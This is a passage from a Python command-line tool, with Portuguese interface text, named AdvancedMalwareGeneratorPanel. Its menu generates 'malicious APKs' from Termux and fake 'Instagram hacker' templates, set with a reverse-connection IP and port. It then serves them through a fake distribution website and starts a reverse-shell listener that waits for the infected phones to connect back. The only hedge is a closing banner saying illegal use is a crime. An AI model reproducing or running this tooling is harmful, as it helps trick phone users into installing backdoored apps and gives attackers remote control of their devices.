            elif choice == "5":
                self.show_advanced_settings()
            elif choice == "0":
                self.exit_program()
    
    def generate_advanced_malicious_apk(self):
        """Gera um APK malicioso avançado"""
        console.print(Panel.fit(
            "[bold]📱 GERADOR DE APK MALICIOSO AVANÇADO[/bold]",
            border_style="blue"
        ))
        
        apk_type = Prompt.ask(
            "[yellow]?[/yellow] Tipo de APK",
            choices=["termux", "instahacker"],
            default="termux"
        )
        
        lhost = Prompt.ask(
            "[yellow]?[/yellow] IP para conexão reversa",
            default=socket.gethostbyname(socket.gethostname())
        )
        
        lport = IntPrompt.ask(
            "[yellow]?[/yellow] Porta para conexão",
            default=4444
        )
        
        output_name = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo de saída (opcional)",
            default=""
        )
        
        if not output_name:
            output_name = None
        
        console.print("[yellow]⏳ Gerando APK malicioso avançado...[/yellow]")
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Criando APK...", total=100)
            
            for i in range(100):
                time.sleep(0.05)
                progress.update(task, advance=1)
        
        apk_path = self.apk_generator.generate_advanced_apk(
            apk_type, lhost, lport, output_name
        )
        
        if apk_path:
            # Perguntar se quer iniciar o servidor web
            if Confirm.ask("[yellow]?[/yellow] Iniciar servidor web para distribuição?"):
                self.start_advanced_web_server(apk_type, apk_path)
        
        input("\nPressione Enter para voltar...")
    
    def start_advanced_web_server(self, apk_type=None, apk_path=None):
        """Inicia o servidor web avançado para distribuição"""
        console.print(Panel.fit(
            "[bold]🌐 SERVIDOR WEB PROFISSIONAL[/bold]",
            border_style="blue"
        ))
        
        if not apk_type:
            apk_type = Prompt.ask(
                "[yellow]?[/yellow] Tipo de APK para servir",
                choices=["termux", "instahacker"],
                default="termux"
            )
        
        if not apk_path:
            # Procurar APK mais recente do tipo especificado
            apk_files = [f for f in os.listdir(APK_OUTPUT_DIR) 
                        if f.startswith(apk_type) and f.endswith('.apk')]
            
            if apk_files:
                apk_files.sort(key=lambda x: os.path.getmtime(os.path.join(APK_OUTPUT_DIR, x)), reverse=True)
                apk_path = os.path.join(APK_OUTPUT_DIR, apk_files[0])
                console.print(f"[yellow]⚠️ Usando APK mais recente: {apk_path}[/yellow]")
            else:
                console.print("[red]❌ Nenhum APK encontrado. Gere um APK primeiro.[/red]")
                input("\nPressione Enter para voltar...")
                return
        
        port = IntPrompt.ask(
            "[yellow]?[/yellow] Porta do servidor web",
            default=8080
        )
        
        # Verificar se porta está disponível
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.bind(('0.0.0.0', port))
            test_socket.close()
        except:
            console.print("[red]❌ Porta já em uso![/red]")
            input("\nPressione Enter para voltar...")
            return
        
        # Iniciar servidor
        try:
            # Obter nome do APK para exibição
            apk_name = self.apk_generator.templates[apk_type]['name']
            
            # Criar handler personalizado
            def handler(*args):
                AdvancedFakeSiteHandler(*args, apk_type=apk_type, apk_path=apk_path, apk_name=apk_name)
            
            self.server = HTTPServer(('0.0.0.0', port), handler)
            
            # Iniciar em thread separada
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            console.print(Panel.fit(
                f"[green]✅ Servidor web profissional iniciado![/green]\n"
                f"[cyan]URL: http://0.0.0.0:{port}[/cyan]\n"
                f"[cyan]Tipo: {apk_type}[/cyan]\n"
                f"[cyan]APK: {apk_path}[/cyan]\n"
                f"[yellow]⚠️ Site completo com CSS, JS e HTML profissional[/yellow]",
                title="[green]SERVIDOR ATIVO[/green]",
                border_style="green"
            ))
            
            console.print("[yellow]⚠️ Pressione Ctrl+C para parar o servidor[/yellow]")
            
            # Manter thread principal ativa
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[yellow]⏹️ Parando servidor...[/yellow]")
                self.stop_web_server()
                
        except Exception as e:
            console.print(f"[red]❌ Erro ao iniciar servidor: {e}[/red]")
        
        input("\nPressione Enter para voltar...")
    
    def start_advanced_shell_listener(self):
        """Inicia listener avançado para shell reverso"""
        console.print(Panel.fit(
            "[bold]👂 LISTENER SHELL REVERSO AVANÇADO[/bold]",
            border_style="blue"
        ))
        
        port = IntPrompt.ask(
            "[yellow]?[/yellow] Porta para escutar",
            default=4444
        )
        
        # Verificar se porta está disponível
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.bind(('0.0.0.0', port))
            test_socket.close()
        except:
            console.print("[red]❌ Porta já em uso![/red]")
            input("\nPressione Enter para voltar...")
            return
        
        console.print(f"[yellow]⚠️ Iniciando listener avançado na porta {port}...[/yellow]")
        console.print("[yellow]⚠️ Pressione Ctrl+C para parar[/yellow]")
        
        try:
            # Iniciar listener em thread separada
            listener_thread = threading.Thread(
                target=self.shell_manager.start_advanced_listener,
                args=(port,)
            )
            listener_thread.daemon = True
            listener_thread.start()
            
            # Manter thread principal ativa
            while listener_thread.is_alive():
                time.sleep(1)
                
        except KeyboardInterrupt:
            console.print("\n[yellow]⏹️ Listener interrompido[/yellow]")
        except Exception as e:
            console.print(f"[red]❌ Erro no listener: {e}[/red]")
        
        input("\nPressione Enter para voltar...")
    
    def manage_generated_apks(self):
        """Mostra APKs gerados"""
        console.print(Panel.fit(
            "[bold]📂 APKs GERADOS[/bold]",
            border_style="blue"
        ))
        
        apk_files = [f for f in os.listdir(APK_OUTPUT_DIR) if f.endswith('.apk')]
        
        if not apk_files:
            console.print("[yellow]⚠️ Nenhum APK gerado ainda.[/yellow]")
            input("\nPressione Enter para voltar...")
            return
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Nome", style="cyan")
        table.add_column("Tamanho", style="green")
        table.add_column("Modificado", style="yellow")
        table.add_column("Tipo", style="blue")
        
        for apk_file in apk_files:
            apk_path = os.path.join(APK_OUTPUT_DIR, apk_file)
            file_size = os.path.getsize(apk_path)
            mod_time = datetime.fromtimestamp(os.path.getmtime(apk_path)).strftime("%Y-%m-%d %H:%M")
            
            # Determinar tipo
            apk_type = "Termux" if "termux" in apk_file.lower() else "InstaHacker"
            
            table.add_row(apk_file, f"{file_size/1024:.1f} KB", mod_time, apk_type)
        
        console.print(table)
        input("\nPressione Enter para voltar...")
    
    def show_advanced_settings(self):
        """Mostra configurações avançadas"""
        console.print(Panel.fit(
            "[bold]⚙️ CONFIGURAÇÕES AVANÇADAS[/bold]",
            border_style="blue"
        ))
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Opção", style="cyan")
        table.add_column("Descrição", style="green")
        table.add_column("Status", style="yellow")
        
        table.add_row("1", "Configurar Template Termux", "📝")
        table.add_row("2", "Configurar Template Instagram Hacker", "📝")
        table.add_row("3", "Gerenciar Portas Padrão", "🔌")
        table.add_row("4", "Configurar Auto-Inicialização", "🔧")
        
        console.print(table)
        
        choice = Prompt.ask(
            "[blink yellow]➤[/blink yellow] Selecione uma opção",
            choices=["1", "2", "3", "4", "0"],
            show_choices=False
        )
        
        if choice == "1":
            self.configure_termux_template()
        elif choice == "2":
            self.configure_instahacker_template()
        elif choice == "3":
            self.configure_ports()
        elif choice == "4":
            self.configure_autostart()
        
        input("\nPressione Enter para voltar...")
    
    def configure_termux_template(self):
        """Configura template do Termux"""
        console.print(Panel.fit(
            "[bold]📝 CONFIGURAR TEMPLATE TERMUX[/bold]",
            border_style="blue"
        ))
        
        console.print("[yellow]⚠️ Funcionalidade em desenvolvimento...[/yellow]")
    
    def configure_instahacker_template(self):
        """Configura template do Instagram Hacker"""
        console.print(Panel.fit(
            "[bold]📝 CONFIGURAR TEMPLATE INSTAGRAM HACKER[/bold]",
            border_style="blue"
        ))
        
        console.print("[yellow]⚠️ Funcionalidade em desenvolvimento...[/yellow]")
    
    def configure_ports(self):
        """Configura portas padrão"""
        console.print(Panel.fit(
            "[bold]🔌 CONFIGURAR PORTAS PADRÃO[/bold]",
            border_style="blue"
        ))
        
        console.print("[yellow]⚠️ Funcionalidade em desenvolvimento...[/yellow]")
    
    def configure_autostart(self):
        """Configura auto-inicialização"""
        console.print(Panel.fit(
            "[bold]🔧 CONFIGURAR AUTO-INICIALIZAÇÃO[/bold]",
            border_style="blue"
        ))
        
        console.print("[yellow]⚠️ Funcionalidade em desenvolvimento...[/yellow]")
    
    def stop_web_server(self):
        """Para o servidor web"""
        if self.server:
            self.server.shutdown()
            self.server = None
            console.print("[green]✅ Servidor parado[/green]")
    
    def exit_program(self):
        """Sai do programa"""
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
            border_style="red"
        ))
        self.stop_web_server()
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        panel = AdvancedMalwareGeneratorPanel()
        panel.show_menu()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
